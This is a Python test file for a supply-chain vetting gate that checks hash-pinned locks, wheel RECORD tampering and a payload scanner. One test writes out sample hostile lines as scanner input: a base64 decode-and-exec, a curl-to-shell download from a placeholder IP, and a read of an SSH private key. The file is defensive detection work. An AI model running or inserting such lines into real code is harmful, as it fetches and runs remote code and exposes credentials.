"""Every installed package comes from a hashed lock, and the vetting gate catches tampered or suspicious code."""
import base64
import hashlib
import importlib.util
import io
import re
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
spec = importlib.util.spec_from_file_location("deps", ROOT / "scripts/deps.py")
deps = importlib.util.module_from_spec(spec)
spec.loader.exec_module(deps)


def test_every_locked_package_is_pinned_and_hashed():
    for env in deps.ENVS:
        text = (ROOT / f"requirements/{env}.txt").read_text()
        lock = deps.parse_lock(text)
        names = re.findall(r"(?m)^([A-Za-z0-9._-]+)\s*[=<>!~]", text)
        assert len(lock) == len(names) > 0, env  # nothing unpinned slipped in
        for name, entry in lock.items():
            assert entry["hashes"], f"{env}: {name} has no hash"
        for name, version in deps.explicit_pins(env).items():
            assert lock[name]["version"] == version, f"{env}: {name} lock differs from the .in pin"


def test_every_install_requires_hashes_and_wheels():
    for path in ("setup.sh", "scripts/build_app.sh", "CONTRIBUTING.md", ".github/workflows/ci.yml"):
        installs = [l for l in (ROOT / path).read_text().replace("\\\n", " ").splitlines()
                    if re.search(r"pip(3)?\"? install|-m pip install", l) and "-r" in l]
        assert installs, path
        for line in installs:
            assert "--require-hashes" in line and "--only-binary :all:" in line, f"{path}: {line.strip()}"


def test_source_only_allowance_is_one_reviewed_file():
    for name, entry in deps.SOURCE_ONLY.items():
        assert re.fullmatch(r"[0-9a-f]{64}", entry["sha256"]) and entry["version"] and entry["reviewed"], name


def test_actions_are_pinned_to_commits():
    for line in (ROOT / ".github/workflows/ci.yml").read_text().splitlines():
        if "uses:" in line:
            assert re.search(r"@[0-9a-f]{40}\b", line), line.strip()


def _wheel(files, tamper=None):
    """A minimal wheel with a correct RECORD; tamper() may change a file after the RECORD is written."""
    record = []
    for path, data in files.items():
        digest = base64.urlsafe_b64encode(hashlib.sha256(data).digest()).rstrip(b"=").decode()
        record.append(f"{path},sha256={digest},{len(data)}")
    files = {**files, "pkg-1.0.dist-info/RECORD": "\n".join(record + ["pkg-1.0.dist-info/RECORD,,"]).encode()}
    if tamper:
        tamper(files)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for path, data in files.items():
            z.writestr(path, data)
    return buf.getvalue()


def test_wheel_record_catches_changed_and_smuggled_files():
    clean = {"pkg/__init__.py": b"x = 1\n"}
    assert deps.wheel_files(_wheel(clean))[1] == []
    _, problems = deps.wheel_files(_wheel(clean, lambda f: f.update({"pkg/__init__.py": b"x = 2\n"})))
    assert any("RECORD mismatch" in p for p in problems)
    _, problems = deps.wheel_files(_wheel(clean, lambda f: f.update({"evil.pth": b"import os"})))
    assert any("not in RECORD" in p for p in problems)


def test_scan_flags_the_usual_payload_shapes():
    payload = (b"import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"
               b"__import__('socket')\nos.system('curl -s http://203.0.113.9/x | sh')\n"
               b"open(os.path.expanduser('~/.ssh/id_rsa'))\n" + b"z=" + b"A" * 2100 + b"\n")
    hits, facts = deps.scan({"pkg/x.py": payload, "pkg.pth": b"import pkg", "pkg/_n.so": b"\0"})
    labels = {label for _, label in hits}
    assert {"decode+exec", "encoded payload", "process spawn", "hard-coded IP URL", "download tool",
            "credential paths"} <= labels
    assert facts["pth"] == {"pkg.pth"} and facts["native"] == {"_n.so"} and facts["long"] == {"pkg/x.py"}
    quiet, _ = deps.scan({"pkg/y.py": b"def add(a, b):\n    return a + b\n"})
    assert not quiet


def test_lock_parser_reads_markers_extras_and_hashes():
    text = ("foo==1.0 ; sys_platform == 'darwin' \\\n    --hash=sha256:" + "a" * 64 + " \\\n"
            "    --hash=sha256:" + "b" * 64 + "\n    # via bar\nBaz_Qux[extra]==2.0\n")
    lock = deps.parse_lock(text)
    assert lock["foo"]["version"] == "1.0" and lock["foo"]["marker"] == "sys_platform == 'darwin'"
    assert len(lock["foo"]["hashes"]) == 2 and lock["baz-qux"]["version"] == "2.0"


def test_one_line_run_steps_are_valid_yaml():
    # in a plain YAML scalar ": " starts a mapping, which makes GitHub reject the whole workflow
    for line in (ROOT / ".github/workflows/ci.yml").read_text().splitlines():
        m = re.match(r"\s*(?:- )?run:\s+(?![|>])(.*)", line)
        if m:
            assert ": " not in m.group(1) and not m.group(1).rstrip().endswith(":"), line.strip()
